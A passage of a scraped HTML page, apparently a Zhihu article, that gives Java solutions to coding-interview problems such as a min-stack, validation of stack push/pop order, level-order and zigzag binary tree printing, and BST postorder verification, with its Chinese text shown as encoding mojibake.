href=\"https://zhuanlan.zhihu.com/p/68764988/edit#33-%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97\" class=\"internal\">33. äºŒå‰æœç´¢æ ‘çš„ååºéå†åºåˆ—</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764988/edit#34-%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%AD%E5%92%8C%E4%B8%BA%E6%9F%90%E4%B8%80%E5%80%BC%E7%9A%84%E8%B7%AF%E5%BE%84\" class=\"internal\">34. äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764988/edit#35-%E5%A4%8D%E6%9D%82%E9%93%BE%E8%A1%A8%E7%9A%84%E5%A4%8D%E5%88%B6\" class=\"internal\">35. å¤æ‚é“¾è¡¨çš„å¤åˆ¶</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764988/edit#36-%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%8E%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8\" class=\"internal\">36. äºŒå‰æœç´¢æ ‘ä¸åŒå‘é“¾è¡¨</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764988/edit#37-%E5%BA%8F%E5%88%97%E5%8C%96%E4%BA%8C%E5%8F%89%E6%A0%91\" class=\"internal\">37. åºåˆ—åŒ–äºŒå‰æ ‘</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764988/edit#38-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%8E%92%E5%88%97\" class=\"internal\">38. å­—ç¬¦ä¸²çš„æ’åˆ—</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764988/edit#39-%E6%95%B0%E7%BB%84%E4%B8%AD%E5%87%BA%E7%8E%B0%E6%AC%A1%E6%95%B0%E8%B6%85%E8%BF%87%E4%B8%80%E5%8D%8A%E7%9A%84%E6%95%B0%E5%AD%97\" class=\"internal\">39. æ•°ç»„ä¸­å‡ºç°æ¬¡æ•°è¶…è¿‡ä¸€åŠçš„æ•°å­—</a> </li></ul><h2>30. åŒ…å« min å‡½æ•°çš„æ ˆ</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/4c776177d2c04c2494f2555c9fcc1e49%3FtpId%3D13%26tqId%3D11173%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>å®šä¹‰æ ˆçš„æ•°æ®ç»“æ„ï¼Œè¯·åœ¨è¯¥ç±»å‹ä¸­å®ç°ä¸€ä¸ªèƒ½å¤Ÿå¾—åˆ°æ ˆæœ€å°å…ƒç´ çš„ min å‡½æ•°ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">private</span> <span class=\"n\">Stack</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">dataStack</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Stack</span><span class=\"o\">&lt;&gt;();</span>\n<span class=\"kd\">private</span> <span class=\"n\">Stack</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">minStack</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Stack</span><span class=\"o\">&lt;&gt;();</span>\n\n<span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">push</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">node</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">dataStack</span><span class=\"o\">.</span><span class=\"na\">push</span><span class=\"o\">(</span><span class=\"n\">node</span><span class=\"o\">);</span>\n    <span class=\"n\">minStack</span><span class=\"o\">.</span><span class=\"na\">push</span><span class=\"o\">(</span><span class=\"n\">minStack</span><span class=\"o\">.</span><span class=\"na\">isEmpty</span><span class=\"o\">()</span> <span class=\"o\">?</span> <span class=\"n\">node</span> <span class=\"o\">:</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">min</span><span class=\"o\">(</span><span class=\"n\">minStack</span><span class=\"o\">.</span><span class=\"na\">peek</span><span class=\"o\">(),</span> <span class=\"n\">node</span><span class=\"o\">));</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">pop</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"n\">dataStack</span><span class=\"o\">.</span><span class=\"na\">pop</span><span class=\"o\">();</span>\n    <span class=\"n\">minStack</span><span class=\"o\">.</span><span class=\"na\">pop</span><span class=\"o\">();</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">top</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"k\">return</span> <span class=\"n\">dataStack</span><span class=\"o\">.</span><span class=\"na\">peek</span><span class=\"o\">();</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">min</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"k\">return</span> <span class=\"n\">minStack</span><span class=\"o\">.</span><span class=\"na\">peek</span><span class=\"o\">();</span>\n<span class=\"o\">}</span></code></pre></div><h2>31. æ ˆçš„å‹å…¥ã€å¼¹å‡ºåºåˆ—</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/d77d11405cc7470d82554cb392585106%3FtpId%3D13%26tqId%3D11174%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>è¾“å…¥ä¸¤ä¸ªæ•´æ•°åºåˆ—ï¼Œç¬¬ä¸€ä¸ªåºåˆ—è¡¨ç¤ºæ ˆçš„å‹å…¥é¡ºåºï¼Œè¯·åˆ¤æ–­ç¬¬äºŒä¸ªåºåˆ—æ˜¯å¦ä¸ºè¯¥æ ˆçš„å¼¹å‡ºé¡ºåºã€‚å‡è®¾å‹å…¥æ ˆçš„æ‰€æœ‰æ•°å­—å‡ä¸ç›¸ç­‰ã€‚</p><p>ä¾‹å¦‚åºåˆ— 1,2,3,4,5 æ˜¯æŸæ ˆçš„å‹å…¥é¡ºåºï¼Œåºåˆ— 4,5,3,2,1 æ˜¯è¯¥å‹æ ˆåºåˆ—å¯¹åº”çš„ä¸€ä¸ªå¼¹å‡ºåºåˆ—ï¼Œä½† 4,3,5,1,2 å°±ä¸å¯èƒ½æ˜¯è¯¥å‹æ ˆåºåˆ—çš„å¼¹å‡ºåºåˆ—ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><p>ä½¿ç”¨ä¸€ä¸ªæ ˆæ¥æ¨¡æ‹Ÿå‹å…¥å¼¹å‡ºæ“ä½œã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">boolean</span> <span class=\"nf\">IsPopOrder</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">pushSequence</span><span class=\"o\">,</span> <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">popSequence</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">n</span> <span class=\"o\">=</span> <span class=\"n\">pushSequence</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span>\n    <span class=\"n\">Stack</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">stack</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Stack</span><span class=\"o\">&lt;&gt;();</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">pushIndex</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">popIndex</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">pushIndex</span> <span class=\"o\">&lt;</span> <span class=\"n\">n</span><span class=\"o\">;</span> <span class=\"n\">pushIndex</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"n\">stack</span><span class=\"o\">.</span><span class=\"na\">push</span><span class=\"o\">(</span><span class=\"n\">pushSequence</span><span class=\"o\">[</span><span class=\"n\">pushIndex</span><span class=\"o\">]);</span>\n        <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">popIndex</span> <span class=\"o\">&lt;</span> <span class=\"n\">n</span> <span class=\"o\">&amp;&amp;</span> <span class=\"o\">!</span><span class=\"n\">stack</span><span class=\"o\">.</span><span class=\"na\">isEmpty</span><span class=\"o\">()</span> \n                <span class=\"o\">&amp;&amp;</span> <span class=\"n\">stack</span><span class=\"o\">.</span><span class=\"na\">peek</span><span class=\"o\">()</span> <span class=\"o\">==</span> <span class=\"n\">popSequence</span><span class=\"o\">[</span><span class=\"n\">popIndex</span><span class=\"o\">])</span> <span class=\"o\">{</span>\n            <span class=\"n\">stack</span><span class=\"o\">.</span><span class=\"na\">pop</span><span class=\"o\">();</span>\n            <span class=\"n\">popIndex</span><span class=\"o\">++;</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">stack</span><span class=\"o\">.</span><span class=\"na\">isEmpty</span><span class=\"o\">();</span>\n<span class=\"o\">}</span></code></pre></div><h2>32.1 ä»ä¸Šå¾€ä¸‹æ‰“å°äºŒå‰æ ‘</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/7fe2212963db4790b57431d9ed259701%3FtpId%3D13%26tqId%3D11175%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>ä»ä¸Šå¾€ä¸‹æ‰“å°å‡ºäºŒå‰æ ‘çš„æ¯ä¸ªèŠ‚ç‚¹ï¼ŒåŒå±‚èŠ‚ç‚¹ä»å·¦è‡³å³æ‰“å°ã€‚</p><p>ä¾‹å¦‚ï¼Œä»¥ä¸‹äºŒå‰æ ‘å±‚æ¬¡éå†çš„ç»“æœä¸ºï¼š1,2,3,4,5,6,7</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-383f3b31bd1818a11345669da1e515b0_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"436\" data-rawheight=\"389\" class=\"origin_image zh-lightbox-thumb\" width=\"436\" data-original=\"https://pic1.zhimg.com/v2-383f3b31bd1818a11345669da1e515b0_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;436&#39; height=&#39;389&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"436\" data-rawheight=\"389\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"436\" data-original=\"https://pic1.zhimg.com/v2-383f3b31bd1818a11345669da1e515b0_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-383f3b31bd1818a11345669da1e515b0_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><p>ä½¿ç”¨é˜Ÿåˆ—æ¥è¿›è¡Œå±‚æ¬¡éå†ã€‚</p><p>ä¸éœ€è¦ä½¿ç”¨ä¸¤ä¸ªé˜Ÿåˆ—åˆ†åˆ«å­˜å‚¨å½“å‰å±‚çš„èŠ‚ç‚¹å’Œä¸‹ä¸€å±‚çš„èŠ‚ç‚¹ï¼Œå› ä¸ºåœ¨å¼€å§‹éå†ä¸€å±‚çš„èŠ‚ç‚¹æ—¶ï¼Œå½“å‰é˜Ÿåˆ—ä¸­çš„èŠ‚ç‚¹æ•°å°±æ˜¯å½“å‰å±‚çš„èŠ‚ç‚¹æ•°ï¼Œåªè¦æ§åˆ¶éå†è¿™ä¹ˆå¤šèŠ‚ç‚¹æ•°ï¼Œå°±èƒ½ä¿è¯è¿™æ¬¡éå†çš„éƒ½æ˜¯å½“å‰å±‚çš„èŠ‚ç‚¹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"nf\">PrintFromTopToBottom</span><span class=\"o\">(</span><span class=\"n\">TreeNode</span> <span class=\"n\">root</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">Queue</span><span class=\"o\">&lt;</span><span class=\"n\">TreeNode</span><span class=\"o\">&gt;</span> <span class=\"n\">queue</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">LinkedList</span><span class=\"o\">&lt;&gt;();</span>\n    <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">ret</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n    <span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">root</span><span class=\"o\">);</span>\n    <span class=\"k\">while</span> <span class=\"o\">(!</span><span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">isEmpty</span><span class=\"o\">())</span> <span class=\"o\">{</span>\n        <span class=\"kt\">int</span> <span class=\"n\">cnt</span> <span class=\"o\">=</span> <span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">size</span><span class=\"o\">();</span>\n        <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">cnt</span><span class=\"o\">--</span> <span class=\"o\">&gt;</span> <span class=\"n\">0</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">TreeNode</span> <span class=\"n\">t</span> <span class=\"o\">=</span> <span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">poll</span><span class=\"o\">();</span>\n            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">t</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n                <span class=\"k\">continue</span><span class=\"o\">;</span>\n            <span class=\"n\">ret</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">t</span><span class=\"o\">.</span><span class=\"na\">val</span><span class=\"o\">);</span>\n            <span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">t</span><span class=\"o\">.</span><span class=\"na\">left</span><span class=\"o\">);</span>\n            <span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">t</span><span class=\"o\">.</span><span class=\"na\">right</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">ret</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>32.2 æŠŠäºŒå‰æ ‘æ‰“å°æˆå¤šè¡Œ</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/445c44d982d04483b04a54f298796288%3FtpId%3D13%26tqId%3D11213%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>å’Œä¸Šé¢˜å‡ ä¹ä¸€æ ·ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;&gt;</span> <span class=\"nf\">Print</span><span class=\"o\">(</span><span class=\"n\">TreeNode</span> <span class=\"n\">pRoot</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;&gt;</span> <span class=\"n\">ret</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n    <span class=\"n\">Queue</span><span class=\"o\">&lt;</span><span class=\"n\">TreeNode</span><span class=\"o\">&gt;</span> <span class=\"n\">queue</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">LinkedList</span><span class=\"o\">&lt;&gt;();</span>\n    <span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">pRoot</span><span class=\"o\">);</span>\n    <span class=\"k\">while</span> <span class=\"o\">(!</span><span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">isEmpty</span><span class=\"o\">())</span> <span class=\"o\">{</span>\n        <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">list</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n        <span class=\"kt\">int</span> <span class=\"n\">cnt</span> <span class=\"o\">=</span> <span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">size</span><span class=\"o\">();</span>\n        <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">cnt</span><span class=\"o\">--</span> <span class=\"o\">&gt;</span> <span class=\"n\">0</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">TreeNode</span> <span class=\"n\">node</span> <span class=\"o\">=</span> <span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">poll</span><span class=\"o\">();</span>\n            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">node</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n                <span class=\"k\">continue</span><span class=\"o\">;</span>\n            <span class=\"n\">list</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">val</span><span class=\"o\">);</span>\n            <span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">left</span><span class=\"o\">);</span>\n            <span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">right</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">list</span><span class=\"o\">.</span><span class=\"na\">size</span><span class=\"o\">()</span> <span class=\"o\">!=</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n            <span class=\"n\">ret</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">list</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">ret</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>32.3 æŒ‰ä¹‹å­—å½¢é¡ºåºæ‰“å°äºŒå‰æ ‘</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/91b69814117f4e8097390d107d2efbe0%3FtpId%3D13%26tqId%3D11212%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>è¯·å®ç°ä¸€ä¸ªå‡½æ•°æŒ‰ç…§ä¹‹å­—å½¢æ‰“å°äºŒå‰æ ‘ï¼Œå³ç¬¬ä¸€è¡ŒæŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºæ‰“å°ï¼Œç¬¬äºŒå±‚æŒ‰ç…§ä»å³è‡³å·¦çš„é¡ºåºæ‰“å°ï¼Œç¬¬ä¸‰è¡ŒæŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºæ‰“å°ï¼Œå…¶ä»–è¡Œä»¥æ­¤ç±»æ¨ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;&gt;</span> <span class=\"nf\">Print</span><span class=\"o\">(</span><span class=\"n\">TreeNode</span> <span class=\"n\">pRoot</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;&gt;</span> <span class=\"n\">ret</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n    <span class=\"n\">Queue</span><span class=\"o\">&lt;</span><span class=\"n\">TreeNode</span><span class=\"o\">&gt;</span> <span class=\"n\">queue</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">LinkedList</span><span class=\"o\">&lt;&gt;();</span>\n    <span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">pRoot</span><span class=\"o\">);</span>\n    <span class=\"kt\">boolean</span> <span class=\"n\">reverse</span> <span class=\"o\">=</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(!</span><span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">isEmpty</span><span class=\"o\">())</span> <span class=\"o\">{</span>\n        <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">list</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n        <span class=\"kt\">int</span> <span class=\"n\">cnt</span> <span class=\"o\">=</span> <span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">size</span><span class=\"o\">();</span>\n        <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">cnt</span><span class=\"o\">--</span> <span class=\"o\">&gt;</span> <span class=\"n\">0</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">TreeNode</span> <span class=\"n\">node</span> <span class=\"o\">=</span> <span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">poll</span><span class=\"o\">();</span>\n            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">node</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n                <span class=\"k\">continue</span><span class=\"o\">;</span>\n            <span class=\"n\">list</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">val</span><span class=\"o\">);</span>\n            <span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">left</span><span class=\"o\">);</span>\n            <span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">right</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">reverse</span><span class=\"o\">)</span>\n            <span class=\"n\">Collections</span><span class=\"o\">.</span><span class=\"na\">reverse</span><span class=\"o\">(</span><span class=\"n\">list</span><span class=\"o\">);</span>\n        <span class=\"n\">reverse</span> <span class=\"o\">=</span> <span class=\"o\">!</span><span class=\"n\">reverse</span><span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">list</span><span class=\"o\">.</span><span class=\"na\">size</span><span class=\"o\">()</span> <span class=\"o\">!=</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n            <span class=\"n\">ret</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">list</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">ret</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>33. äºŒå‰æœç´¢æ ‘çš„ååºéå†åºåˆ—</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/a861533d45854474ac791d90e447bafd%3FtpId%3D13%26tqId%3D11176%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>è¾“å…¥ä¸€ä¸ªæ•´æ•°æ•°ç»„ï¼Œåˆ¤æ–­è¯¥æ•°ç»„æ˜¯ä¸æ˜¯æŸäºŒå‰æœç´¢æ ‘çš„ååºéå†çš„ç»“æœã€‚å‡è®¾è¾“å…¥çš„æ•°ç»„çš„ä»»æ„ä¸¤ä¸ªæ•°å­—éƒ½äº’ä¸ç›¸åŒã€‚</p><p>ä¾‹å¦‚ï¼Œä¸‹å›¾æ˜¯ååºéå†åºåˆ— 1,3,2 æ‰€å¯¹åº”çš„äºŒå‰æœç´¢æ ‘ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-8266fb847353371e5a8bcfeae46ad87f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"251\" data-rawheight=\"249\" class=\"content_image\" width=\"251\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;251&#39; height=&#39;249&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"251\" data-rawheight=\"249\" class=\"content_image lazy\" width=\"251\" data-actualsrc=\"https://pic4.zhimg.com/v2-8266fb847353371e5a8bcfeae46ad87f_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">boolean</span> <span class=\"nf\">VerifySquenceOfBST</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">sequence</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">sequence</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"n\">sequence</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"n\">verify</span><span class=\"o\">(</span><span class=\"n\">sequence</span><span class=\"o\">,</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">sequence</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">boolean</span> <span class=\"nf\">verify</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">sequence</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">first</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">last</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">last</span> <span class=\"o\">-</span> <span class=\"n\">first</span> <span class=\"o\">&lt;=</span> <span class=\"n\">1</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">rootVal</span> <span class=\"o\">=</span> <span class=\"n\">sequence</span><span class=\"o\">[</span><span class=\"n\">last</span><span class=\"o\">];</span>\n    <span class=\"kt\">int</span> <span class=\"n\">cutIndex</span> <span class=\"o\">=</span> <span class=\"n\">first</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">cutIndex</span> <span class=\"o\">&lt;</span> <span class=\"n\">last</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">sequence</span><span class=\"o\">[</span><span class=\"n\">cutIndex</span><span class=\"o\">]</span> <span class=\"o\">&lt;=</span> <span class=\"n\">rootVal</span><span 